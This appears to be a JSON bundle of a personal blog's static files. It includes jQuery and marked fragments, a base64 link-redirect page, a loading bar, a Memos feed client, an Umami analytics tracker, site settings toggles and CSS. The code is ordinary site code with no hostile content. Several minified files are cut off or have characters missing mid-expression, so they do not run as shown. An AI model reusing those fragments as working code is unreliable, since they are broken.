e.nodeType&&\"function\"!=typeof e.item},y=function(e){return null!=e&&e===e.window},C=ie.document,u={type:!0,src:!0,nonce:!0,noModule:!0};function m(e,t,n){var r,i,o=(n=n||C).createElement(\"script\");if(o.text=e,t)for(r in u)(i=t[r]||t.getAttribute&&t.getAttribute(r))&&o.setAttribute(r,i);n.head.appendChild(o).parentNode.removeChild(o)}function x(e){return null==e?e+\"\":\"object\"==typeof e||\"function\"==typeof e?n[i.call(e)]||\"object\":typeof e}var t=\"3.7.1\",l=/HTML$/i,ce=function(e,t){return new ce.fn.init(e,t)};function c(e){var t=!!e&&\"length\"in e&&e.length,n=x(e);return!v(e)&&!y(e)&&(\"array\"===n||0===t||\"number\"==typeof t&&0"},{"path":"/js/jump.js","content":"const host = window.location.host; function GetQueryString(name) { var reg = new RegExp(\"(^|&)\" + name + \"=([^&]*)(&|$)\", \"i\"); var r = window.location.search.substr(1).match(reg); return r ? decodeURI(r[2]) : null; } function base64Decode(input) { const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='; let str = input.replace(/=+$/, ''); let output = ''; if (str.length % 4 == 1) { throw new Error(\"'atob' failed: The string to be decoded is not correctly encoded.\"); } for (let bc = 0, bs, buffer, idx = 0; buffer = str.charAt(idx++); ~buffer && (bs = bc % 4 ? bs * 64 + buffer : buffer, bc++ % 4) ? output += String.fromCharCode(255 & bs >> (-2 * bc & 6)) : 0) { buffer = chars.indexOf(buffer); } return output; } var jump_url = GetQueryString('u'); jump_url = base64Decode(jump_url); var UrlReg = '^((http|https|thunder|qqdl|ed2k|Flashget|qbrowser|ftp|rtsp|mms)://)'; if (!jump_url || !jump_url.match(UrlReg)) { document.title = '参数错误，正在返回首页...'; jump_url = location.origin; } let countdown = 10; let countdownElement; let jumpUrlElement; function updateCountdown() { countdownElement.textContent = countdown; if (countdown === 0) { jump(); } else { countdown--; setTimeout(updateCountdown, 1000); } } function jump() { location.href = jump_url; } function closeWindow() { window.opener = null; window.close(); } function loadAvatar() { const avatarImg = document.querySelector('.avatar'); const placeholder = document.querySelector('.avatar-placeholder'); const img = new Image(); img.src = '{{avatar}}'; img.onload = function () { avatarImg.src = img.src; avatarImg.style.display = 'block'; placeholder.style.display = 'none'; }; } window.onload = function () { loadAvatar(); progressElement = document.getElementById('progress'); countdownElement = document.getElementById('countdown'); jumpUrlElement = document.getElementById('jump-url'); jumpUrlElement.textContent = jump_url; updateCountdown(); }"},{"path":"/js/load.js","content":"function changeProgress(state) { // 更新进度条 function updateProgress(loadedResources) { progress = Math.round((loadedResources / totalResources) * 100); // console.log('加载完成度：',progress,'%') // progressBar.value = progress; document.querySelector('.loader').style.setProperty('--width', progress + '%'); document.querySelector('.loader-text').textContent = progress + '%'; } switch (state) { //开启进度条 case \"start\": //获取页面所有资源 const resources = document.querySelectorAll('script, link');// 获取图片、脚本和链接资源 window.totalResources = resources.length; // 获取资源总数 window.loadedResources = 0;//已加载完成的资源数 window.progress = 0;// 进度值 window.progressBar = document.getElementById('progressBar'); // console.log(\"resources:\",resources) resources.forEach((resource) => {//遍历元素添加load监听事件 resource.addEventListener('load', () => { loadedResources++; // console.log('加载完成的资源数量：',loadedResources) //更新进度条 updateProgress(loadedResources); }); }); break; //结束进度条 case \"end\": updateProgress(totalResources); // document.getElementById(\"eloading\").style.setProperty('min-height', '0'); document.querySelector('.loader').style.setProperty('--width', '100%'); document.querySelector('.loader-text').textContent = 'ヾ(≧▽≦*)o 完成！'; setTimeout(() => { document.getElementById(\"eloading\").style.display = \"none\"; } , 500); break; default: break; } } //dom构建完成 document.addEventListener('DOMContentLoaded', function () { console.log(\"[Loader]dom构建完成\") // 是否启用加载动画 loaderdisabled = localStorage.getItem(\"loader.disabled\"); if (loaderdisabled) { document.getElementById(\"eloading\").style.display = \"none\"; return } else { //页面渲染完成 addEventListener(\"load\", function () { console.log('[Loader]页面加载完成'); changeProgress(\"end\");//结束进度条， }) } changeProgress(\"start\");//开启进度条 })"},{"path":"/js/marked.min.js","content":"/** * marked - a markdown parser * Copyright (c) 2011-2022, Christopher Jeffrey. (MIT Licensed) * https://github.com/markedjs/marked */ !function(e,t){\"object\"==typeof exports&&\"undefined\"!=typeof module?t(exports):\"function\"==typeof define&&define.amd?define([\"exports\"],t):t((e=\"undefined\"!=typeof globalThis?globalThis:e||self).marked={})}(this,function(r){\"use strict\";function i(e,t){for(var u=0;ue.length)&&(t=e.length);for(var u=0,n=new Array(t);u=e.length?{done:!0}:{done:!1,value:e[u++]}};throw new TypeError(\"Invalid attempt to iterate non-iterable instance. In order to be iterable, non-array objects must have a [Symbol.iterator]() method.\")}function e(){return{baseUrl:null,breaks:!1,extensions:null,gfm:!0,headerIds:!0,headerPrefix:\"\",highlight:null,langPrefix:\"language-\",mangle:!0,pedantic:!1,renderer:null,sanitize:!1,sanitizer:null,silent:!1,smartLists:!1,smartypants:!1,tokenizer:null,walkTokens:null,xhtml:!1}}r.defaults=e();function u(e){return t[e]}var n=/[&\"']/,l=/[&\"']/g,a=/[\"']|&(?!#?\\w+;)/,o=/[\"']|&(?!#?\\w+;)/g,t={\"&\":\"&amp;\",\"\":\"&gt;\",'\"':\"&quot;\",\"'\":\"&#39;\"};function D(e,t){if(t){if(n.test(e))return e.replace(l,u)}else if(a.test(e))return e.replace(o,u);return e}var c=/&(#(?:\\d+)|(?:#x[0-9A-Fa-f]+)|(?:\\w+));?/gi;function x(e){return e.replace(c,function(e,t){return\"colon\"===(t=t.toLowerCase())?\":\":\"#\"===t.charAt(0)?\"x\"===t.charAt(1)?String.fromCharCode(parseInt(t.substring(2),16)):String.fromCharCode(+t.substring(1)):\"\"})}var h=/(^|[^\\[])\\^/g;function p(u,e){u=\"string\"==typeof u?u:u.source,e=e||\"\";var n={replace:function(e,t){return t=(t=t.source||t).replace(h,\"$1\"),u=u.replace(e,t),n},getRegex:function(){return new RegExp(u,e)}};return n}var f=/[^\\w:]/g,Z=/^$|^[a-z][a-z0-9+.-]*:|^[?#]/i;function g(e,t,u){if(e){try{n=decodeURIComponent(x(u)).replace(f,\"\").toLowerCase()}catch(e){return null}if(0===n.indexOf(\"javascript:\")||0===n.indexOf(\"vbscript:\")||0===n.indexOf(\"data:\"))return null}var n;t&&!Z.test(u)&&(e=u,F[\" \"+(n=t)]||(O.test(n)?F[\" \"+n]=n+\"/\":F[\" \"+n]=k(n,\"/\",!0)),t=-1===(n=F[\" \"+n]).indexOf(\":\"),u=\"//\"===e.substring(0,2)?t?e:n.replace(q,\"$1\")+e:\"/\"===e.charAt(0)?t?e:n.replace(L,\"$1\")+e:n+e);try{u=encodeURI(u).replace(/%25/g,\"%\")}catch(e){return null}return u}var F={},O=/^[^:]+:\\/*[^/]*$/,q=/^([^:]+:)[\\s\\S]*$/,L=/^([^:]+:\\/*[^/]*)[\\s\\S]*$/;var A={exec:function(){}};function d(e){for(var t,u,n=1;n"},{"path":"/js/memos.js","content":"/** * memos.js 24.3.10 * https://immmmm.com/ */ // let currentUrl = window.location.href; // let hashIndex = currentUrl.indexOf('#'); // if (hashIndex !== -1) { // let newUrl = currentUrl.substring(0, hashIndex); // history.replaceState(null, null, newUrl); // } function getQueryParam(param) { const urlParams = new URLSearchParams(window.location.search); return urlParams.get(param); } const page_id = getQueryParam('id'); var memosData = { dom:\"#memos\", listDom:\"#memo-list\", limit:\"8\" } var memosDom = document.querySelector(memosData.dom); let memoList var memoDefaultList = [ { \"creatorName\" : \"Thun888\", \"website\" : \"https://blog.hzchu.top\", \"link\" : \"https://get-tg-channel-api.hzchu.top\", \"creatorId\" : \"101\", \"avatar\" : \"/img/avatar.webp\", \"artalk\" : \"https://artalk.hzchu.top\", \"artSite\" : \"Thun888\" }, { \"creatorName\": \"林木木\", \"website\": \"https://immmmm.com\", \"link\": \"https://me.edui.fun\", \"creatorId\": \"101\", \"avatar\": \"https://gravatar.memobbs.app/avatar/ba83fa02fc4b2ba621514941307e21be?s=80\", \"twikoo\": \"https://metk.edui.fun\" } ]; var userNow = ` ` memosDom.insertAdjacentHTML('beforebegin', userNow); var backTop = `` memosDom.insertAdjacentHTML('afterend', backTop); var getEditor = window.localStorage && window.localStorage.getItem(\"memos-editor-display\"); var getMode = window.localStorage && window.localStorage.getItem(\"memos-mode\"); var memosOpenId = window.localStorage && window.localStorage.getItem(\"memos-access-token\"); var memosPath = window.localStorage && window.localStorage.getItem(\"memos-access-path\"); var memosMeID = window.localStorage && window.localStorage.getItem(\"memos-me-id\"); var memosMeNickname = window.localStorage && window.localStorage.getItem(\"memos-me-nickname\"); var memosMeAvatarUrl = window.localStorage && window.localStorage.getItem(\"memos-me-avatarurl\"); var memosMeArtalk = window.localStorage && window.localStorage.getItem(\"memos-artalk-input\"); var memosMeArtalkSite = window.localStorage && window.localStorage.getItem(\"memos-artalksite-input\"); var memosMeTwikoo = window.localStorage && window.localStorage.getItem(\"memos-twikoo-input\"); let cfwkAiUrl = window.localStorage && window.localStorage.getItem(\"memos-cfwkai-url\") let geminiKey = window.localStorage && window.localStorage.getItem(\"memos-gemini-key\") let filterName = window.localStorage && window.localStorage.getItem(\"memos-filter-name\") var themeTogglebtn = document.querySelector(\".memos-theme-toggle\"); var myFeedsBtn = document.querySelector(\".my-blog-feeds\"); var memosEditorInner = document.querySelector(\".memos-editor-inner\"); var memosEditorOption = document.querySelector(\".memos-editor-option\"); var memosRadomCont = document.querySelector(\".memos-random\"); var taglistBtn = document.querySelector(\".tag-btn\"); var codeoneBtn = document.querySelector(\".codeone-btn\"); var codeBtn = document.querySelector(\".code-btn\"); var linkBtn = document.querySelector(\".link-btn\"); var linkPicBtn = document.querySelector(\".linkpic-btn\"); var cfAiBtn = document.querySelector(\".cfworkerai-btn\") || \"\"; var cfAiLoadBtn = document.querySelector(\".cfworkerai-load-btn\"); var geminiAIBtn = document.querySelector(\".geminiai-btn\") || \"\"; var geminiAILoadBtn = document.querySelector(\".geminiai-load-btn\"); var randomBtn = document.querySelector(\".random-btn\"); var oneDayBtn = document.querySelector(\".oneday-btn\"); var userButton = document.querySelector('.user-button-span'); var privateBtn = document.querySelector(\".private-btn\"); var switchUserBtn = document.querySelector(\".switchUser-btn\"); var loadEditorBtn = document.querySelector(\".call-memos-editor\"); var searchBtn = document.querySelector(\".search-memos-btn\"); var searchInput = document.querySelector(\".search-memos-input\"); var userlistBtn = document.querySelector(\".userlist-memos\"); var randomUserBtn = document.querySelector(\".randomuser-memos\"); var submitApiBtn = document.querySelector(\".submit-openapi-btn\"); var submitMemoBtn = document.querySelector(\".submit-memos-btn\"); var memosVisibilitySelect = document.querySelector(\".select-memos-value\"); var pathInput = document.querySelector(\".memos-path-input\"); var tokenInput = document.querySelector(\".memos-token-input\"); var artalkInput = document.querySelector(\".memos-artalk-input\"); var artalkSiteInput = document.querySelector(\".memos-artalksite-input\"); var twikooInput = document.querySelector(\".memos-twikoo-input\"); var cfwkAiUrlInput = document.querySelector(\".cfwkai-url-input\"); var geminiKeyInput = document.querySelector(\".gemini-key-input\"); var filterNameInput = document.querySelector(\".filter-name-input\"); var uploadImageInput = document.querySelector(\".memos-upload-image-input\"); //Webp格式 var uploadWebpImageInput = document.querySelector(\".memos-upload-Webp-image-input\"); var memosTextarea = document.querySelector(\".memos-editor-textarea\"); var editMemoDom = document.querySelector(\".edit-memos\"); var editMemoBtn = document.querySelector(\".edit-memos-btn\"); var cancelEditBtn = document.querySelector(\".cancel-edit-btn\"); var biaoqingBtn = document.querySelector(\".biao-qing-btn\"); var usernowDom = document.querySelector(\".user-now\"); var usernowBtnDom = document.querySelectorAll(\".user-now .button\"); var goHomeBtn = document.querySelector('.gohome-memos') var goBbsBtn = document.querySelector('.gobbs-memos') var memoDom = document.querySelector(memosData.listDom); var skeleton = ``; var load = `加载更多`; memoDom.insertAdjacentHTML('afterend', load); var loadBtn = document.querySelector(\"button.button-load\"); var limit = memosData.limit,page = 1,nums = 0,dataNum = 0,memosContType = 0, memosAccess = 0,randomUser = 0; var memoData = [],memosStr = [],memoCreatorMap = {},twikooCount = {},artalkCount = {}; let memosMode; let nowLink; let nowId; let nowName; let nowAvatar; let nowTagList = \"\"; var memoChangeDate = 0; var getSelectedValue = window.localStorage && window.localStorage.getItem(\"memos-visibility-select\") || \"PUBLIC\"; document.addEventListener(\"DOMContentLoaded\", () => { let getTheme = window.localStorage && window.localStorage.getItem(\"theme\"); if (getTheme !== null && getTheme == \"dark\"){ document.body.classList.add(\"dark-theme\",\"dark\"); }else{ document.body.classList.remove(\"dark-theme\",\"dark\"); } if (getTheme == null && window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) { document.body.classList.add(\"dark-theme\",\"dark\"); } }); themeTogglebtn.addEventListener('click', function() { if(!document.body.classList.contains(\"dark\")){ document.body.classList.add(\"dark-theme\",\"dark\"); window.localStorage && window.localStorage.setItem(\"theme\",\"dark\"); }else{ document.body.classList.remove(\"dark-theme\",\"dark\"); window.localStorage && window.localStorage.setItem(\"theme\",\"light\"); } }); document.addEventListener(\"DOMContentLoaded\", async () => { memoOurList = memoDefaultList if(typeof memosMyList !== 'undefined'){ const mergedArray = [...memosMyList, ...memoOurList]; memoList = mergedArray.filter((item, index) => { const stringifiedItem = JSON.stringify(item); return index === mergedArray.findIndex(obj => { return JSON.stringify(obj) === stringifiedItem; }); }); }else{ memoList = memoOurList } //查询当前页面 window.location.origin 作为主页展示 let memobbsAdmin = [] let memobbsLink = window.location.origin; let linkIndex = memoList.findIndex(item => (item.website == memobbsLink)) if(linkIndex >= 0){ memobbsAdmin.push(memoList[linkIndex]) const mergedArray2 = [...memobbsAdmin, ...memoList]; memoList = mergedArray2.filter((item, index) => { const stringifiedItem = JSON.stringify(item); return index === mergedArray2.findIndex(obj => { return JSON.stringify(obj) === stringifiedItem; }); }); } nowLink = memosPath || memoList[0].link; nowId = memosMeID || memoList[0].creatorId; nowName = memosMeNickname || memoList[0].creatorName; nowAvatar = memosMeAvatarUrl || memoList[0].avatar; memoFollow(getMode); }); // 获取自定义 memos.json 订阅列表 async function getMemoListData(url) { const response = await fetch(url); const data = await response.json(); if(filterName){ let namesToRemove = filterName.replace(/，/g, \",\").split(','); for (let name of namesToRemove) { let nameIndex = data.myMemoList.findIndex(item => (item.creatorName == name)); if (nameIndex !== -1) { delete data.myMemoList.splice(nameIndex, 1); } }; } return data.myMemoList } function memoFollow(mode) { //记忆显示模式 usernowBtnDom.forEach((item) => {item.classList.remove('current');}) if(mode == \"MEMOSHOME\"){ goHomeBtn.classList.add(\"current\") getUserMemos(nowLink,nowId,nowName,nowAvatar,\"\",\"\",\"MEMOSHOME\") }else if(mode == \"MEMOSBBS\"){ goBbsBtn.classList.add(\"current\") getMemos(); }else if(mode == \"RANDUSER\"){ randomUserBtn.classList.add(\"current\") goRandUser() }else if(mode == \"NOPUBLIC\"){ getUserMemos(nowLink,nowId,nowName,nowAvatar,\"\",\"\",mode) }else if(mode == \"oneday\"){ getUserMemos(nowLink,nowId,nowName,nowAvatar,\"\",\"\",mode) }else{ goHomeBtn.classList.add(\"current\") getUserMemos(nowLink,nowId,nowName,nowAvatar) } loadBtn.addEventListener(\"click\", function () { if(page < dataNum) { page++; } updateData(memoData) cocoMessage.success(\"加载中\"); }); async function getMemoCount(m) { let twikooData = m.filter(item => item.twikoo); if (twikooData.length !== 0) { let twikooRes = {}; for (const { creatorName, twikoo, link, id } of twikooData) { if (!twikooRes[creatorName]) { twikooRes[creatorName] = { creatorName, envId: twikoo, urls: [] }; } twikooRes[creatorName].urls.push(`${link}/m/${id}`); } let twikooList = Object.values(twikooRes); let twikooPromise = await Promise.all( twikooList.map(async (item) => { try { let res = await twikoo.getCommentsCount({ envId: item.envId, urls: item.urls, includeReply: false }); return res; } catch (err) { console.error(err); return []; } }) ); twikooCount = twikooPromise.flatMap(r => r); } let artalkData = m.filter(item => item.artalk); if (artalkData.length !== 0) { let artalkRes = {}; for (const { creatorName, artalk, artSite, link, id } of artalkData) { if (!artalkRes[creatorName]) { artalkRes[creatorName] = { creatorName, envId: artalk, site_name: artSite, link, urls: [] }; } artalkRes[creatorName].urls.push(`/m/${id}`); } let artalkList = Object.values(artalkRes); let artalkPromise = await Promise.all( artalkList.map(async (item) => { try { let pageKeys = item.urls.join(','); let siteName = item.site_name; let response = await fetch(`${item.envId}/api/v2/stats/page_comment?page_keys=${pageKeys}&site_name=${siteName}`); if (!response.ok) { throw new Error(`Request failed`); } let results = await response.json(); let countList = item.urls.map(url => { let count = results.data[url] || 0; return { url: item.link + url, count }; }); return countList; } catch (err) { return []; } }) ) artalkCount = artalkPromise.flatMap(r => r); } for (const item of m) { let count = 0; let url = `${item.link}/m/${item.id}`; if (item.twikoo) { let memoCount = twikooCount.find((o) => o.url === url); if (memoCount) { count = memoCount.count; } } else if (item.artalk) { let memoCount = artalkCount.find((o) => o.url === url); if (memoCount) { count = memoCount.count; } } item.count = count; } return m; } this.getMemoCount = getMemoCount; function updateData(res) { let oneDayTag = window.localStorage && window.localStorage.getItem(\"memos-oneday-tag\"); if(oneDayTag !== null){ const firstItem = res.slice(0, 1); const restItems = res.slice(1); // 对后面的内容进行排序 restItems.sort((a, b) => b.createdTs - a.createdTs); // 将两部分合并在一起 const sortedArray = firstItem.concat(restItems); // 返回排序后的数组 pagination(sortedArray) dataNum = Math.ceil(sortedArray.length/limit); nums = dataNum - 1; if (page > nums) { loadBtn.classList.add('d-none'); return }; }else{ res.sort((i,o)=>{ return( o.createdTs - i.createdTs) }) pagination(res) dataNum = Math.ceil(res.length/limit); nums = dataNum - 1; if (page > nums) { loadBtn.classList.add('d-none'); return }; } } this.updateData = updateData; function pagination(data) { memosStr = []; var last = page * limit - 1; last = last >= data.length ? (data.length - 1) : last; for (var i = (page * limit - limit); i"},{"path":"/js/seeyou.js","content":"!function(){\"use strict\";(t=>{const{screen:{width:e,height:a},navigator:{language:r},location:n,localStorage:i,document:c,history:o}=t,{hostname:s,href:u}=n,{currentScript:l,referrer:d}=c;if(!l)return;const f=\"data-\",m=l.getAttribute.bind(l),h=m(f+\"website-id\"),p=m(f+\"host-url\"),g=m(f+\"tag\"),y=\"false\"!==m(f+\"auto-track\"),b=\"true\"===m(f+\"exclude-search\"),v=m(f+\"domains\")||\"\",S=v.split(\",\").map((t=>t.trim())),w=`${(p||\"\"||l.src.split(\"/\").slice(0,-1).join(\"/\")).replace(/\\/$/,\"\")}/api/send`,N=`${e}x${a}`,T=/data-umami-event-([\\w-_]+)/,A=f+\"umami-event\",x=300,O=t=>{if(t){try{const e=decodeURI(t);if(e!==t)return e}catch{return t}return encodeURI(t)}},U=t=>{try{const{pathname:e,search:a}=new URL(t);t=e+a}catch{}return b?t.split(\"?\")[0]:t},j=()=>({website:h,hostname:s,screen:N,language:r,title:O(_),url:O(B),referrer:O(D),tag:g||void 0}),k=(t,e,a)=>{a&&(D=B,B=U(a.toString()),B!==D&&setTimeout($,x))},E=()=>i&&i.getItem(\"umami.disabled\")||v&&!S.includes(s),L=async(t,e=\"event\")=>{if(E())return;const a={\"Content-Type\":\"application/json\"};void 0!==K&&(a[\"x-umami-cache\"]=K);try{const r=await fetch(w,{method:\"POST\",body:JSON.stringify({type:e,payload:t}),headers:a}),n=await r.text();return K=n}catch{}},$=(t,e)=>L(\"string\"==typeof t?{...j(),name:t,data:\"object\"==typeof e?e:void 0}:\"object\"==typeof t?t:\"function\"==typeof t?t(j()):j()),I=t=>L({...j(),data:t},\"identify\");t.umami||(t.umami={track:$,identify:I});let K,R,B=U(u),D=d!==s?d:\"\",_=c.title;if(y&&!E()){(()=>{const t=(t,e,a)=>{const r=t[e];return(...e)=>(a.apply(null,e),r.apply(t,e))};o.pushState=t(o,\"pushState\",k),o.replaceState=t(o,\"replaceState\",k)})(),(()=>{const t=new MutationObserver((([t])=>{_=t&&t.target?t.target.text:void 0})),e=c.querySelector(\"head > title\");e&&t.observe(e,{subtree:!0,characterData:!0,childList:!0})})(),c.addEventListener(\"click\",(async t=>{const e=t=>[\"BUTTON\",\"A\"].includes(t),a=async t=>{const e=t.getAttribute.bind(t),a=e(A);if(a){const r={};return t.getAttributeNames().forEach((t=>{const a=t.match(T);a&&(r[a[1]]=e(t))})),$(a,r)}},r=t.target,i=e(r.tagName)?r:((t,a)=>{let r=t;for(let t=0;t{o||(n.href=e)}))}else if(\"BUTTON\"===i.tagName)return a(i)}}),!0);const t=()=>{\"complete\"!==c.readyState||R||($(),R=!0)};c.addEventListener(\"readystatechange\",t,!0),t()}})(window)}();"},{"path":"/js/settings.js","content":"function stitchumami() { const umamiKey = 'umami.disabled'; const umamiStatus = localStorage.getItem(umamiKey); if (!umamiStatus || umamiStatus === '0') { localStorage.setItem(umamiKey, '1'); hud.toast('已禁用Umami统计'); } else if (umamiStatus === '1') { localStorage.removeItem(umamiKey); hud.toast('已启用Umami统计'); } initstatus() } function switchselectFastNode() { const key = 'onep.cdn.select.disabled'; const status = localStorage.getItem(key); if (!status || status === '0') { localStorage.setItem(key, '1'); hud.toast('已禁用图片节点优选'); } else if (status === '1') { localStorage.removeItem(key); hud.toast('已启用图片节点优选'); } initstatus() } function switchloader() { const key = 'loader.disabled'; const status = localStorage.getItem(key); if (!status || status === '0') { localStorage.setItem(key, '1'); hud.toast('已禁用加载动画'); } else if (status === '1') { localStorage.removeItem(key); hud.toast('已启用加载动画'); } initstatus() } function switchaisummary() { const aisummaryKey = 'config.aisummary.status'; const aisummaryStatus = localStorage.getItem(aisummaryKey); if (!aisummaryStatus || aisummaryStatus === '0') { localStorage.setItem(aisummaryKey, '1'); hud.toast('已启用AI摘要'); } else if (aisummaryStatus === '1') { localStorage.removeItem(aisummaryKey); hud.toast('已禁用AI摘要'); } initstatus() } function refreshONEP() { selectFastNode(true); // 似乎localstorage有延迟 setTimeout(function(){ initstatus(); },100); } function initstatus(){ // 初始化图片节点优选状态 var selectFastNodeStatus = localStorage.getItem('onep.cdn.select.disabled'); var text = (!selectFastNodeStatus || selectFastNodeStatus === '0') ? '已启用' : '已禁用'; $('#selectFastNode-status').text(text); var selectFastNodeNodeInfoData = localStorage.getItem('onep.cdn.nodelist'); var selectFastNodeNodeInfo = '本地无节点信息'; if (selectFastNodeNodeInfoData) { var data = JSON.parse(selectFastNodeNodeInfoData); var now = new Date(); if (data.link === null && now.getTime() - data.time < 5 * 60 * 1000) { selectFastNodeNodeInfo = '近期获取节点错误'; } else if (now.getTime() - data.time < 5 * 60 * 1000) { selectFastNodeNodeInfo = data.link; }else { selectFastNodeNodeInfo = data.link + ' (已过期)'; } } $('#selectFastNode-nodeinfo').text(selectFastNodeNodeInfo); // 初始化umami状态 var umamiStatus = localStorage.getItem('umami.disabled'); text = (!umamiStatus || umamiStatus === '0') ? '已启用' : '已禁用'; $('#umami-status').text(text); // 初始化AI摘要状态 var aisummaryStatus = localStorage.getItem('config.aisummary.status'); text = (!aisummaryStatus || aisummaryStatus === '0') ? '已禁用' : '已启用'; $('#aisummary-status').text(text); // 初始化加载动画状态 var loaderStatus = localStorage.getItem('loader.disabled'); text = (!loaderStatus || loaderStatus === '0') ? '已启用' : '已禁用'; $('#loader-status').text(text); } //页面渲染完成 addEventListener(\"load\",function(){ initstatus() })"},{"path":"/mcss/mcss.css","content":"/* build time:Sat Sep 07 2024 02:26:43 GMT+0000 (Coordinated Universal Time)*/ .old-message{padding:5px 10px;font-size:15px;border:1px solid #e2e2e2;background-color:#eee;border-left:5px solid #ed8e13;color:#333;overflow:hidden}.tag-plugin.timeline .body img[atk-emoticon]{max-height:40px;display:initial;margin:0}.tag-plugin.timeline .body img{max-height:200px}.bread-nav div#page-words span.sep:before{content:'|'}.bread-nav div#page-words span.updated{visibility:hidden}.bread-nav:hover div#page-words span.updated{visibility:visible}@media print{#link-icon,.l_left,.l_right,.top.bread-nav.footnote,div#comments,div#post-ai,div#read-next,div#related-posts,footer,section#license,section#share{display:none}.md-text psw{color:unset;background:unset;border:3px dashed var(--block-border)}.markdownIt-Anchor{display:none}.article.banner{background:0 0;border-bottom:1px dashed var(--block-border)}.banner,.banner.top{border-radius:0}.banner .bottom,table{padding:0}#start{display:unset}p{margin:0!important}h1,h2,h3,h4,h5,h6{margin:0!important}img{max-height:100vh}.md-text{max-width:100%;line-height:unset}}li:not([class]) a:not([class]),p:not([class]) a:not([class]),table a:not([class]){padding-bottom:.1rem;background:linear-gradient(0,var(--theme-link-opa),var(--theme-link-opa)) no-repeat center bottom/100% 40%} /* rebuild by neat */"},{"path":"/mcss/fancybox.min.css","content":":root{--f-spinner-width:36px;--f-spinner-height:36px;--f-spinner-color-1:rgba(0, 0, 0, 0.1);--f-spinner-color-2:rgba(17, 24, 28, 0.8);--f-spinner-stroke:2.75}.f-spinner{margin:auto;padding:0;width:var(--f-spinner-width);height:var(--f-spinner-height)}.f-spinner svg{width:100%;height:100%;vertical-align:top;animation:f-spinner-rotate 2s linear infinite}.f-spinner svg *{stroke-width:var(--f-spinner-stroke);fill:none}.f-spinner svg :first-child{stroke:var(--f-spinner-color-1)}.f-spinner svg :last-child{stroke:var(--f-spinner-color-2);animation:f-spinner-dash 2s ease-in-out infinite}@keyframes f-spinner-rotate{100%{transform:rotate(360deg)}}@keyframes f-spinner-dash{0%{stroke-dasharray:1,150;stroke-dashoffset:0}50%{stroke-dasharray:90,150;stroke-dashoffset:-35}100%{stroke-dasharray:90,150;stroke-dashoffset:-124}}.f-throwOutUp{animation:.175s ease-out both f-throwOutUp}.f-throwOutDown{animation:.175s ease-out both f-throwOutDown}@keyframes f-throwOutUp{to{transform:translate3d(0,-150px,0);opacity:0}}@keyframes f-throwOutDown{to{transform:translate3d(0,150px,0);opacity:0}}.f-zoomInUp{animation:var(--f-transition-duration,.2s) ease-out .1s both f-zoomInUp}.f-zoomOutDown{animation:var(--f-transition-duration,.2s) ease-out both f-zoomOutDown}@keyframes f-zoomInUp{from{transform:scale(.975) translate3d(0,16px,0);opacity:0}to{transform:scale(1) translate3d(0,0,0);opacity:1}}@keyframes f-zoomOutDown{to{transform:scale(.975) translate3d(0,16px,0);opacity:0}}.f-fadeIn{animation:var(--f-transition-duration,.2s) ease both f-fadeIn;z-index:2}.f-fadeOut{animation:var(--f-transition-duration,.2s) ease both f-fadeOut;z-index:1}@keyframes f-fadeIn{0%{opacity:0}100%{opacity:1}}@keyframes f-fadeOut{100%{opacity:0}}.f-fadeSlowIn{animation:var(--f-transition-duration,.5s) ease both f-fadeSlowIn;z-index:2}.f-fadeSlowOut{animation:var(--f-transition-duration,.5s) ease both f-fadeSlowOut;z-index:1}@keyframes f-fadeSlowIn{0%{opacity:0}100%{opacity:1}}@keyframes f-fadeSlowOut{100%{opacity:0}}.f-fadeFastIn{animation:var(--f-transition-duration,.2s) ease-out both f-fadeFastIn;z-index:2}.f-fadeFastOut{animation:var(--f-transition-duration,.2s) ease-out both f-fadeFastOut;z-index:2}@keyframes f-fadeFastIn{0%{opacity:.75}100%{opacity:1}}@keyframes f-fadeFastOut{100%{opacity:0}}.f-crossfadeIn{animation:var(--f-transition-duration,.2s) ease-out both f-crossfadeIn;z-index:2}.f-crossfadeOut{animation:calc(var(--f-transition-duration,.2s)*.5) linear .1s both f-crossfadeOut;z-index:1}@keyframes f-crossfadeIn{0%{opacity:0}100%{opacity:1}}@keyframes f-crossfadeOut{100%{opacity:0}}.f-slideIn.from-next{animation:var(--f-transition-duration,.85s) cubic-bezier(.16,1,.3,1) f-slideInNext}.f-slideIn.from-prev{animation:var(--f-transition-duration,.85s) cubic-bezier(.16,1,.3,1) f-slideInPrev}.f-slideOut.to-next{animation:var(--f-transition-duration,.85s) cubic-bezier(.16,1,.3,1) f-slideOutNext}.f-slideOut.to-prev{animation:var(--f-transition-duration,.85s) cubic-bezier(.16,1,.3,1) f-slideOutPrev}@keyframes f-slideInPrev{0%{transform:translateX(100%)}100%{transform:translate3d(0,0,0)}}@keyframes f-slideInNext{0%{transform:translateX(-100%)}100%{transform:translate3d(0,0,0)}}@keyframes f-slideOutNext{100%{transform:translateX(-100%)}}@keyframes f-slideOutPrev{100%{transform:translateX(100%)}}.f-classicIn.from-next{animation:var(--f-transition-duration,.85s) cubic-bezier(.16,1,.3,1) f-classicInNext;z-index:2}.f-classicIn.from-prev{animation:var(--f-transition-duration,.85s) cubic-bezier(.16,1,.3,1) f-classicInPrev;z-index:2}.f-classicOut.to-next{animation:var(--f-transition-duration,.85s) cubic-bezier(.16,1,.3,1) f-classicOutNext;z-index:1}.f-classicOut.to-prev{animation:var(--f-transition-duration,.85s) cubic-bezier(.16,1,.3,1) f-classicOutPrev;z-index:1}@keyframes f-classicInNext{0%{transform:translateX(-75px);opacity:0}100%{transform:translate3d(0,0,0);opacity:1}}@keyframes f-classicInPrev{0%{transform:translateX(75px);opacity:0}100%{transform:translate3d(0,0,0);opacity:1}}@keyframes f-classicOutNext{100%{transform:translateX(-75px);opacity:0}}@keyframes f-classicOutPrev{100%{transform:translateX(75px);opacity:0}}:root{--f-button-width:40px;--f-button-height:40px;--f-button-border:0;--f-button-border-radius:0;--f-button-color:#374151;--f-button-bg:#f8f8f8;--f-button-hover-bg:#e0e0e0;--f-button-active-bg:#d0d0d0;--f-button-shadow:none;--f-button-transition:all 0.15s 